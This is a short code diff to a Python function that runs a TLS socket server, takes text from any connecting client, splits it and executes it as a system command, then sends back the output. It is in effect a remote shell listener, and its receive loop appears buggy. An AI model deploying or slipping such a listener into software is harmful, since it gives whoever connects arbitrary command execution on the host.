@@ -19,12 +19,14 @@ def interact(cert ,key ,host ,port):
             while 1:
                 conn, addr = ssock.accept()
                 print('Connected by', addr)
-                while True:
+                while 1:
                     recieve = conn.recv(1024)
                     if (recieve  !=0):
                         break
                     print(f"Recieved: {recieve}")
-                command = run(recieve, capture_output=True).stdout
+                recieve=recieve.decode()
+                command_split=recieve.split(" ")
+                command = run(command_split, capture_output=True).stdout
                 conn.send(command)
 def get_host_info(host):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
